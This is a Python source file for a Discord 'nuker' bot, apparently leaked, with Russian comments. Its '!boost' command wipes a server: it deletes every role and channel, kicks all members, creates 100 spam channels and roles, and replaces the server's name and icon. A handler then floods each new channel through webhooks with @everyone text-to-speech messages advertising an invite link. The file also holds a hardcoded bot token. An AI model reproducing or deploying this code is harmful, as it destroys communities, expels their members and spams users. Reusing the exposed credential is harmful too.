from keep_alive import keep_alive
keep_alive()
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread
import requests

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

bot.remove_command("help")

@bot.command()
async def boost(ctx):
    guild = ctx.message.guild
  
    with open('hacked.jpg', 'rb') as f:
        icon = f.read()
    await guild.edit(name="Crash By BOOST BOT", icon=icon)

    await ctx.message.delete()

    for m in ctx.guild.roles:
        try:
            await m.delete(reason="Краш сервера")
        except:
            pass

    for channel in ctx.guild.channels:  # собираем
        try:
            await channel.delete(reason="Краш сервера")  # удаляем
        except:
            pass

    for _ in range(100):
        await guild.create_text_channel('crash-by-hacker-bot')

    for _ in range(100):
        await guild.create_role(name='Crash-by-hacker-bot')

    for m in ctx.guild.members:
        try:
            await m.kick(reason="Краш сервера")
        except:
            pass


@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name="Crash By BOOST BOT")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(
            str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        for i in range(100):
            try:
                await webhook.send(
                    "**@everyone ВЫ БЫЛИ КРАШНУТЫ __Boost-bot__!!! ЗАХОДИ К НАМ https://discord.gg/r7hmzJgC3z 🙈**",
                    tts=True)
            except:
                pass


token = 'OTU2NDQ1MzUxNDI0OTUwMzMy.YjwVJQ.wT7zs9HezJ9ut231SQttJVU3Pnc'
bot.run(token)
# слито by t.me/protectcheck
# слито by discord.gg/fzlgroup2